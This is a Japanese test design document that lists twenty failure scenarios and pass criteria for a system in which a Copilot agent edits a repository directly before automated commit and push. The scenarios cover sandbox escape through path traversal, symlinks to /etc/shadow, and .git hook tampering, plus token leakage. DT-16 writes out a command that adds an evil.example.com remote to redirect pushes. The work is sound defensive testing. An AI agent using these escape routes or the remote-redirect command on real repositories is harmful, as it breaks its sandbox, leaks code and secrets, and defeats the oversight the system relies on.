# 丸投げシステム (Maru-nage v2) Phase 6 直接編集アーキテクチャ 破壊的テスト設計書

## 0. 目的

本書は、Phase 6（直接編集アーキテクチャ）の設計を論理的に破壊し、RED テストで保証すべき異常系と合格基準を定義する。対象設計書は `docs/phase6-direct-edit-design.md`。

## 1. テスト方針

1. Phase 4/5 の artifact 経由間接編集から直接編集への転換に伴い、**新たに導入される暗黙の前提**が崩れた時に安全に失敗することを定義する。
2. copilot が直接ファイルを編集するため、sandbox 脱出の防御ポイントが「diff パス検証」から「`git diff --name-only` の出力検証」に移る。この検証が崩れた場合に安全側に倒れることを最優先で保証する。
3. commit/push を各フェーズ終了時に行う新フローでは、git コマンド失敗・認証障害・リモート拒否を task 単位で閉じ込め、worker を巻き込まないことを検証する。
4. 旧 Phase 4 prompt ガードレール（「ファイル編集するな」）が完全に撤去され、新 prompt 方針に置き換わっていることを保証する。
5. `GITHUB_TOKEN` やその他の秘密情報が commit content、commit message、`logs` に平文で残らないことを保証する。

## 2. 破壊シナリオと合格基準

### DT-01: 旧 prompt ガードレールが残存

- 攻撃シナリオ: `_build_prompt()` が Phase 4 の「ファイル編集するな」「git push するな」「提案テキストだけ返せ」のガードレール 5 行を含んだまま copilot を呼び出す。copilot はファイル編集を行わず、artifact テキストのみ返す（旧挙動に退行）。
- Red 条件: ガードレール 5 行のうち 1 行でも prompt 内に残っている。
- Green 条件: `_build_prompt()` の出力に旧ガードレール 5 行が一切含まれず、「リポジトリのファイルを直接編集し、変更を完成させよ」相当の指示が含まれること。

### DT-02: prompt が「git commit / git push を実行するな」を欠落

- 攻撃シナリオ: 新 prompt から「git commit / git push は実行するな（システム側で行う）」の制約が欠落しており、copilot が自前で commit & push を行う。結果として、システム側の commit/push と二重実行になるか、copilot が意図しないブランチへ push する。
- Red 条件: prompt に「git commit / git push はシステムが行う」旨の制約がない。
- Green 条件: prompt に「git commit / git push は実行するな」が明示的に含まれること。

### DT-03: prompt が「リポジトリ外のファイルを編集するな」を欠落

- 攻撃シナリオ: prompt からリポジトリ外編集の禁止指示が欠落しており、copilot が `/workspace/{task_id}/` 配下の `artifacts/`、`patches/`、`system_docs_snapshot/`、またはまったく別のパスのファイルを編集する。
- Red 条件: prompt にリポジトリ外編集禁止の指示がなく、copilot が repo 外のファイルを変更しても sandbox 検証前に commit される。
- Green 条件: prompt に「リポジトリ外のファイルを編集するな」が含まれ、さらに DT-06 の sandbox 検証がバックストップとして強制されること。

### DT-04: `commit_and_push()` 呼び出し前に copilot が何も編集しなかった（変更なし）

- 攻撃シナリオ: copilot CLI が正常終了(exit 0)するが、リポジトリ内のファイルを一切変更しない。`git status --short` / `git diff --name-only` が空。
- Red 条件: 空 commit を作成して push する、または成功扱いで次フェーズへ進む。
- Green 条件: 変更なしを検知し、`phase_N_no_changes` を `logs` に記録する。空 commit は作成せず、設計 §2.1 に従い次フェーズへスキップ進行するか `blocked` へ遷移する（フェーズ固有ポリシーで決定）。

### DT-05: `validate_changed_files()` へ渡す `git diff --name-only` 出力に `..` がある

- 攻撃シナリオ: copilot が `.git` の内部操作またはシンボリックリンク経由で、`git diff --name-only` の出力に `../../etc/passwd` や `../other_task/repo/secret` を含むパスを差し込む。
- Red 条件: `..` を含む変更パスが sandbox 検証をパスし、commit & push される。
- Green 条件: `validate_changed_files()` が `..` セグメントを含むパスを拒否し、`blocked` へ遷移する。

### DT-06: `git diff --name-only` 出力に sandbox 外への絶対パスがある

- 攻撃シナリオ: `git diff --name-only` が `/etc/passwd` や `/workspace/other_task/repo/` などの絶対パスを返す。
- Red 条件: 絶対パスが sandbox 検証を通過し、commit される。
- Green 条件: 絶対パスを拒否し、`blocked` へ遷移する。

### DT-07: copilot が `.git/` ディレクトリ配下を変更

- 攻撃シナリオ: copilot が `.git/hooks/pre-commit` や `.git/config` を編集し、git hooks によるコード実行やリモート URL 書き換えを仕込む。`git diff --name-only` にこれらが現れるかは git の動作に依存する。
- Red 条件: `.git/` 配下の変更が commit される、または git 設定が改竄されたまま push が行われる。
- Green 条件: `validate_changed_files()` が `.git/` 配下への変更を検出して拒否するか、`git add -A` の前に `.git/` 変更を除外すること。`blocked` へ遷移する。

### DT-08: copilot がシンボリックリンクを作成して sandbox 外を参照

- 攻撃シナリオ: copilot が `/workspace/{task_id}/repo/link → /etc/shadow` のようなシンボリックリンクを作成し、そのリンク先がリポジトリに追加される。`git diff --name-only` にはリンクパスのみ表示される。
- Red 条件: シンボリックリンク経由で sandbox 外のファイルがリポジトリに含まれて push される。
- Green 条件: 変更ファイルの `realpath` を検証し、sandbox 外への参照を拒否して `blocked` へ遷移する。

### DT-09: commit 失敗 — `user.name` / `user.email` 未設定

- 攻撃シナリオ: コンテナ環境に `user.name` / `user.email` が設定されておらず、`git commit` が拒否される。
- Red 条件: 未処理例外が worker まで伝播する、または staged changes が放置される。
- Green 条件: commit 前に `user.name` / `user.email` をシステム既定値で設定するか、commit 失敗を捕捉して `blocked` へ遷移する。

### DT-10: commit message への秘密情報混入

- 攻撃シナリオ: task タイトルや `result_summary_md` に `GITHUB_TOKEN` やその他認証トークンが含まれており、それが commit message に挿入される。
- Red 条件: git history に秘密情報が平文で残る。
- Green 条件: commit message 生成時に Phase 4 同等のマスキング（`GITHUB_TOKEN`, `GH_TOKEN`, `COPILOT_GITHUB_TOKEN` の置換）を適用し、秘密情報を除去する。

### DT-11: push 認証失敗 — GITHUB_TOKEN 失効

- 攻撃シナリオ: `GITHUB_TOKEN` が失効しており、`git push origin {working_branch}` が認証エラーで失敗する。
- Red 条件: 無制限にリトライする、または commit 済み・push 未済の中途状態のまま task が `succeeded` 扱いになる。
- Green 条件: push 認証失敗を恒久障害として分類し、task を `blocked` に遷移させ、`logs` にエラー種別を残す。commit は成功しているため、次回リトライ時に再 commit せず push のみをリトライ可能な設計であること。

### DT-12: push がリモートに拒否される（ブランチ保護）

- 攻撃シナリオ: ブランチ保護ルール、force-push 禁止、または non-fast-forward により `git push` がリモートから拒否される。
- Red 条件: worker がハングする、または一時障害として無制限リトライする。
- Green 条件: リモート拒否を恒久障害として分類し、`blocked` へ遷移する。

### DT-13: commit 済みファイルに秘密情報が含まれる

- 攻撃シナリオ: copilot が編集したファイル内容に `GITHUB_TOKEN` の実値やサービスキーが埋め込まれている。commit & push 後に git history に秘密情報が永続化する。
- Red 条件: 秘密情報を含むファイルが commit & push され、git history に残る。
- Green 条件: commit 前に `git diff` の内容に対して秘密情報マスキングスキャンを適用し、検出時は `blocked` へ遷移する。または、Phase 4 の `_sanitize_response()` で対応済みの場合は、copilot の直接編集でも同等のスキャンが `commit_and_push()` 内で行われること。

### DT-14: workspace_path が不正（DB 不整合による sandbox 逸脱）

- 攻撃シナリオ: `tasks.workspace_path` が DB 操作で `/tmp/evil` や `/workspace/other_task/` に改変されている。copilot の `--add-dir` がこの不正パスを受け取り、不正ディレクトリ上で編集＋commit が走る。
- Red 条件: workspace 外のディレクトリで copilot 編集と commit/push が実行される。
- Green 条件: Phase 3/4 同等の sandbox 再検証を commit/push フロー開始前に実施し、不正パスなら `blocked` へ遷移する。

### DT-15: apply_artifact() の旧パスが残存

- 攻撃シナリオ: Phase 5 の `apply_artifact()` が非推奨化されず、何らかのコードパスから呼び出されて artifact 経由のファイル反映が発生する。直接編集と artifact apply が競合し、repo が不整合な状態になる。
- Red 条件: `apply_artifact()` が呼び出し可能な状態のまま残っている。
- Green 条件: `apply_artifact()` のコールサイト（`apply_artifact_for_task()` 含む）が削除されているか、明示的にエラーを投げて呼び出しを拒否すること。

### DT-16: remote 注入による push 先上書き

- 攻撃シナリオ: copilot が `git remote add malicious https://evil.example.com/repo.git` を実行し、後続の `git push` が意図しないリモートに向かう。
- Red 条件: clone 元以外のリモートへの push が発生する。
- Green 条件: `commit_and_push()` が push 先を常に `origin` とハードコードし、copilot による `git remote` 操作の結果に依存しないこと。

### DT-17: copilot が大量ファイルを変更（資源枯渇）

- 攻撃シナリオ: copilot が数千ファイルを変更し、`git add -A` → `git commit` でメモリ・ディスク・CPU を圧迫する。
- Red 条件: worker が OOM で死ぬか、ディスク枯渇で他 task を巻き込む。
- Green 条件: `validate_changed_files()` で変更ファイル数に上限を設ける。上限超過時は `blocked` へ遷移する。Phase 4 の応答サイズ上限と整合させる。

### DT-18: git 操作タイムアウト

- 攻撃シナリオ: `git push` がネットワーク障害で無期限にハングする。
- Red 条件: worker スレッドがハングし、lease 失効後に別 worker が同一 task を二重実行する。
- Green 条件: git 操作にタイムアウトを設定し、超過時は `blocked` へ遷移する。`subprocess.run(timeout=...)` で制御する。

### DT-19: フェーズ固有 commit のメッセージ形式不正

- 攻撃シナリオ: commit message のフォーマットがフェーズ番号やタスク ID を含む定型文を逸脱し、後続のログ解析やフェーズトラッキングを破壊する。
- Red 条件: commit message が空文字、改行のみ、または `git commit -m ""` で git がエラーを投げる。
- Green 条件: `commit_and_push()` がフェーズ番号とタスク ID を含む定型 commit message を生成し、空や不正な入力は安全なデフォルトへフォールバックする。

### DT-20: copilot CLI 実行は成功するが working_branch が未設定

- 攻撃シナリオ: task の `working_branch` が `NULL` / 空文字のまま copilot 呼び出し後の commit/push フローに入る。`git push origin ""` が予期しない動作をする。
- Red 条件: `git push origin` がデフォルトブランチに push するか、git がエラーを投げて worker を巻き込む。
- Green 条件: commit/push フロー開始前に `working_branch` が有効な値であることを検証し、無効なら `blocked` へ遷移する。

## 3. RED で確認すべき項目

1. **prompt 転換**: 旧ガードレール 5 行が `_build_prompt()` から完全に撤去され、直接編集指示に置き換わっていること（DT-01〜03）。
2. **変更なし処理**: copilot が何も編集しなかった場合に空 commit が作成されず、`logs` に記録されること（DT-04）。
3. **sandbox 検証**: `validate_changed_files()` が `..`、絶対パス、`.git/`、symlink を含む変更パスを拒否すること（DT-05〜08）。
4. **commit/push 失敗の閉じ込め**: commit 失敗、push 認証失敗、リモート拒否が task 単位で `blocked` に閉じ込められ、worker が次 task を処理可能なこと（DT-09, DT-11〜12, DT-18）。
5. **秘密情報保護**: commit message と commit 内容に `GITHUB_TOKEN` やその他秘密情報が平文で含まれないこと（DT-10, DT-13）。
6. **旧パス廃止**: `apply_artifact()` / `apply_artifact_for_task()` の呼び出しパスが削除または無効化されていること（DT-15）。
7. **remote 固定**: push 先が常に `origin` にハードコードされ、copilot や task payload による上書きが不可能なこと（DT-16）。
8. **資源保護**: 大量ファイル変更・git 操作タイムアウトに対する上限があること（DT-17〜18）。
9. **前提条件検証**: `working_branch` が有効であること（DT-20）。

## 4. 設計へのフィードバック

本書で以下の設計上の未確定事項を確定する:

- **DT-04 確定**: 変更なし時の振る舞いは Phase 5 DT-09 の方針を踏襲し、フェーズ固有の判断に委ねる。フェーズ 0（設計書作成）やフェーズ 4（実装）など変更が期待されるフェーズで変更なしの場合は `blocked` へ遷移する。フェーズ間オーケストレーション（Feature #4）の実装時に詳細化する。
- **DT-13 確定**: copilot の直接編集ではシステムが中間 artifact を介さないため、commit 前の `git diff` 内容に対して秘密情報スキャンを行う。Phase 4 の `_sanitize_response()` のロジックを `commit_and_push()` 内に転用する。
- **DT-15 確定**: `apply_artifact()` と `apply_artifact_for_task()` は本 pivot で呼び出しパスから削除する。メソッド本体は `DeprecationWarning` 付きで残すか完全削除するかは実装時に判断するが、アクティブなコードパスからは必ず除去する。
- **DT-17 確定**: 変更ファイル数の上限は環境変数 `MAX_CHANGED_FILES`（デフォルト: 100）で制御する。超過時は `blocked` へ遷移し、`too_many_changed_files` イベントを `logs` に記録する。

## 5. 関連ドキュメント

1. `docs/phase6-direct-edit-design.md`
2. `docs/phase5-artifact-apply-design.md` (旧設計・参考)
3. `docs/phase5-artifact-apply-destructive-test-design.md` (旧破壊テスト・参考)
4. `docs/phase4-llm-integration-design.md`
5. `docs/phase4-llm-integration-destructive-test-design.md`
6. `.tdd_protocol.md`
